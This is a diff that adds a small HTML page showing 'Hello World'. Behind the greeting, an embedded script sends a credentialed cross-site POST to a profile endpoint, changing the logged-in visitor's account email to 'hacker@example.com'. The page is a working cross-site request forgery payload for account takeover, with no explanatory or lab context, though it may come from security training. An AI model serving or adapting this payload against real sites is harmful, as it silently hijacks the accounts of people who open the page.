@@ -1,0 +1,13 @@
+<html>
+<body>
+Hello World
+<script>
+	var xhr = new XMLHttpRequest();
+  xhr.open("POST", "https://example.com/profile.php", true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  xhr.withCredentials = true;
+  var body = "email=hacker@example.com&action=Change+email";
+  xhr.send(body);
+</script>
+</body>
+</html>
